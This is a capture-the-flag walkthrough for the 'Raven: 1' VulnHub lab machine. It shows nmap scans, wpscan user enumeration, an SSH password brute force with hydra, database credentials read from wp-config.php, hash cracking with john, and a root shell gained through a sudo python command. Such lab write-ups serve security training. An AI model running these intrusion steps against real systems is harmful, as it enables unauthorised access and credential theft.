:::::::::::::::::::::::::::::::: page
# Raven: 1 {#raven-1 .title}

\

## 

## Raven: 1

- **[Raven: 1]{style="color:#ffbe6f;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/raven-1,256/>

![](images/824-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#ff7800;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/824-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.170
:::

![](images/824-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.170
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.170 
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.170
:::

![](images/824-4.png)

1.  [Web Enumeration]{style="color:#ff7800;"} :

- IP visit in browser : <http://192.168.2.170/>
  <http://192.168.2.170/wordpress/>
  <http://192.168.2.170/wordpress/wp-login.php>
  <http://192.168.2.170/vendor/>

<!-- -->

- Add hostname in /etc/hosts :

::: codebox
    echo "192.168.2.170 raven.local" >> /etc/hosts
:::

![](images/824-5.png)

- Find username with wpscan cpmmand :

::: codebox
    wpscan --url http://192.168.2.170/wordpress --enumerate u --wp-content-dir wp-content
:::

![](images/824-6.png)

- Found User\'s :

::: codebox
    michael
    steven
:::

1.  [SSH Access]{style="color:#ff7800;"} :

- SSH brute force to find password :

::: codebox
    hydra -l michael -P /opt/rockyou.txt ssh://192.168.2.170
:::

![](images/824-7.png)

- SSH Login :

::: codebox
    ssh michael@192.168.2.170
:::

![](images/824-8.png)

- Navigate the directory and check the lists :

::: codebox
    cd /var/www
:::

- 

::: codebox
    ls
:::

- Read the flag file :

::: codebox
    cat flag2.txt
:::

![](images/824-9.png)

- Now navigate the wordpress directory :

::: codebox
    cd /var/www/html/wordpress
:::

- 

::: codebox
    ls
:::

![](images/824-10.png)

- Read the wp-config.php file :

::: codebox
    cat wp-config.php
:::

![](images/824-11.png)

- Found database username and password :

::: codebox
    Username : root
    Password : R@v3nSecurity
:::

- Now login mysql :

::: codebox
    mysql -u root -pR@v3nSecurity
:::

![](images/824-12.png)

- In database dump the data :

::: codebox
    show databases;
:::

- 

::: codebox
    use wordpress;
:::

- 

::: codebox
    show tables;
:::

- 

::: codebox
    select * from wp_users;
:::

![](images/824-13.png)

- Hash identify :

::: codebox
    hash-identifier
:::

![](images/824-14.png)

- Crack the hashes :

::: codebox
    nano hashes.txt
:::

![](images/824-15.png)

::: codebox
    john --show --format=phpass hashes.txt
:::

![](images/824-16.png)

- Switch the steven user :

::: codebox
    su steven
:::

- 

::: codebox
    Password : pink84
:::

![](images/824-17.png)

1.  [Privilege Escalation]{style="color:#ff7800;"} :

- Check the sudo permissions :

::: codebox
    sudo -l
:::

![](images/824-18.png) steven user Python ko root ke roop me bina
password use kr skta h .

- Get the root shell :

::: codebox
    sudo python -c 'import os; os.system("/bin/bash")'
:::

![](images/824-19.png)
::::::::::::::::::::::::::::::::
